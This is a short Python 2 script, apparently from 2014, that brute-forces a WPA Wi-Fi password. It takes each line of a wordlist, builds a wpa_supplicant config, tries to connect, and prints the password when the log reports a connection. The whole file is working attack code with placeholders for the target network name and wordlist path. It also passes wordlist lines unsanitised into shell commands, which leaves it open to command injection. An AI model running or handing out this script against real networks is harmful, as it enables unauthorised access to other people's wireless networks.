#!/usr/bin/python
#author: Yacked2, 11.10.2014
import os
import subprocess
import shlex
import time
import sys

#####################################
##########Change this data###########
#####################################

file = "/root/Desktop/psw" #wordlist
essid = "home" #router name
interface = "wlan0" #your device
#####################################

conf = "/root/wpa.conf" #place where we create conf file
driver = "wext" #driver
killall = "killall -w wpa_supplicant" #command to kill wpa_supplicant and wait it to die
log = "/root/logging" #place where we create log file


with open(file) as f:
	#for each line in wordlist
    for line in f:
	#removing \r\n
	line=  line.splitlines()
	line[0] = line[0].replace("\r","")
	line[0] = line[0].replace("\n","")
	
	#delete previous conf and log file if exist
	if os.path.exists(conf):
		os.remove(conf)
	if os.path.exists(log):
		os.remove(log)
	
	#kill wpa_supplicant if running
	os.system(killall)
	
	#create conf file
	os.system("wpa_passphrase " + essid +" " + str(line[0]) + " > "+conf)
	
	#run wpa_supplicant
	command = "wpa_supplicant -B -f " + log + " -D" + driver +" -i"+ interface+" -c"+conf
	os.system(command)
	
	#waiting while log is empty
	while(os.path.exists(log) == False or os.stat(log).st_size==0 ):
		pass

	#checking log file
	working = True
	while(working):
		f = open(log)
		for a in f:
			if(a.find("CTRL-EVENT-CONNECTED") != -1):
				#right password
				print essid+":"+line[0]
				os.system(killall)
				os.remove(log)
				sys.exit(0)
			elif(a.find("CTRL-EVENT-DISCONNECTED") != -1):
				#wrong key
				working = False
				break
		f.close()
	
	#clear
	os.system(killall)
	os.remove(log)
	os.remove(conf)
